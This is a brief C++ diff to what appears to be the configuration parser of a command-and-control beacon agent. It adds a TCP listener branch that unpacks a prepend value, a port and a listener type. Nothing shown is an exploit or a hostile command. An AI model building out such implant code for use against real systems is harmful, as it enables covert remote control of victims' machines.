@@ -46,6 +46,11 @@ AgentConfig::AgentConfig()
 	this->profile.pipename = packer->UnpackBytesCopy(&length);
 	this->listener_type = packer->Unpack32();
 
+#elif defined(BEACON_TCP)
+	this->profile.prepend = packer->UnpackBytesCopy(&length);
+	this->profile.port    = packer->Unpack32();
+	this->listener_type   = packer->Unpack32();
+
 #endif
 
 	this->sleep_delay  = packer->Unpack32();
